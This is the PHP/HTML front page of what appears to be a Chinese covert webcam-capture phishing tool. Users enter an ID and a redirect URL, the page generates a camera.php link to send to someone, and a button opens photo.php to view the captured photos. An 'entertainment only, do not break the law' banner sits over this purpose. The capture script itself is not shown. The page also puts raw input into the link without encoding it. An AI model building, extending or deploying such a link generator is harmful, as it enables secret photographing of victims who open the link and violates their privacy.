<?php
// 引入配置
include 'config.php';

// 获取站点设置信息
try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $pdo->query("SELECT * FROM settings LIMIT 1");
    $settings = $stmt->fetch();

    $site_title = $settings['site_title'] ?? '南方科技';
    $site_domain = $settings['site_domain'] ?? 'example.com';
    $announcement = $settings['announcement'] ?? '警告: 本工具仅供娱乐，请勿进行违法活动，违者后果自负！';

} catch (PDOException $e) {
    $site_title = '南方科技';
    $site_domain = 'example.com';
    $announcement = '警告: 本工具仅供娱乐，请勿进行违法活动，违者后果自负！';
}
?>

<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo htmlspecialchars($site_title); ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            padding-bottom: 60px;
            min-height: 100vh;
        }
        .card-custom {
            border-radius: 0.5rem;
            box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
            transition: all 0.3s ease;
        }
        .card-custom:hover {
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.1);
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            height: 60px;
            line-height: 60px;
            background-color: #fff;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
        }
        .navbar-brand {
            font-weight: 600;
        }
        .result-link {
            word-break: break-all;
        }
        .btn-primary {
            background-color: #6c5ce7;
            border-color: #6c5ce7;
        }
        .btn-primary:hover {
            background-color: #5649c0;
            border-color: #5649c0;
        }
        .btn-success {
            background-color: #00b894;
            border-color: #00b894;
        }
        .btn-success:hover {
            background-color: #00a381;
            border-color: #00a381;
        }
        .form-control:focus {
            border-color: #6c5ce7;
            box-shadow: 0 0 0 0.25rem rgba(108, 92, 231, 0.25);
        }
    </style>
</head>
<body>
    <!-- 导航栏 -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-primary shadow-sm">
        <div class="container">
            <a class="navbar-brand d-flex align-items-center" href="#">
                <i class="bi bi-eye-fill me-2"></i>
                <?php echo htmlspecialchars($site_title); ?>
            </a>
        </div>
    </nav>

    <!-- 主要内容 -->
    <div class="container my-4">
        <div class="row justify-content-center">
            <div class="col-lg-8">
                <!-- 公告信息 -->
                <div class="alert alert-warning alert-dismissible fade show mb-4" role="alert">
                    <i class="bi bi-megaphone-fill me-2"></i>
                    <?php echo htmlspecialchars($announcement); ?>
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>

                <!-- 用户输入表单 -->
                <div class="card card-custom mb-4">
                    <div class="card-body">
                        <h5 class="card-title mb-4"><i class="bi bi-pencil-square me-2"></i>输入信息</h5>
                        
                        <div class="form-floating mb-3">
                            <input type="text" class="form-control" id="myid" placeholder="请输入ID">
                            <label for="myid"><i class="bi bi-person-vcard me-2"></i>请输入ID</label>
                        </div>

                        <div class="form-floating mb-3">
                            <input type="text" class="form-control" id="url" placeholder="请输入跳转地址">
                            <label for="url"><i class="bi bi-box-arrow-up-right me-2"></i>请输入跳转地址</label>
                        </div>
                    </div>
                </div>

                <!-- 结果显示卡片 -->
                <div class="card card-custom mb-4">
                    <div class="card-body">
                        <h5 class="card-title mb-3"><i class="bi bi-infinity me-2"></i>链接</h5>
                        <div class="d-flex align-items-center">
                            <i class="bi bi-link-45deg text-primary me-2 fs-5"></i>
                            <a id="kd" class="text-decoration-none result-link text-primary fw-bold" style="pointer-events: none;">请先生成链接！</a>
                        </div>
                    </div>
                </div>

                <!-- 按钮组 -->
                <div class="d-grid gap-3">
                    <button class="btn btn-success btn-lg" onclick="create()">
                        <i class="bi bi-link-45deg me-2"></i>生成链接
                    </button>
                    <button class="btn btn-primary btn-lg" onclick="window.location.href='photo.php?id='+document.getElementById('myid').value">
                        <i class="bi bi-image-fill me-2"></i>查看照片
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- 错误模态框 -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header bg-danger text-white">
                    <h5 class="modal-title"><i class="bi bi-exclamation-triangle-fill me-2"></i>错误</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="d-flex align-items-center">
                        <i class="bi bi-x-circle-fill text-danger me-3 fs-3"></i>
                        <div>ID或跳转地址不能为空！</div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
                        <i class="bi bi-check2-circle me-2"></i>确定
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- 底部导航 -->
    <footer class="footer">
        <div class="container d-flex justify-content-between align-items-center">
            <span class="text-muted">
                <i class="bi bi-c-circle me-1"></i> 2020-2025 <?php echo htmlspecialchars($site_title); ?>
            </span>
            <a href="./admin" class="text-decoration-none text-primary">
                <i class="bi bi-shield-lock me-1"></i>登录
            </a>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function create() {
            var myid = document.getElementById('myid');
            var url = document.getElementById('url');
            var kd = document.getElementById('kd');

            if (myid.value === "" || url.value === "") {
                var errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
                errorModal.show();
                return false;
            }

            kd.href = 'https://<?php echo htmlspecialchars($site_domain); ?>/camera.php?id=' + myid.value + '&url=' + url.value;
            kd.innerText = kd.href;
            kd.style.pointerEvents = 'auto';
        }
    </script>
</body>
</html>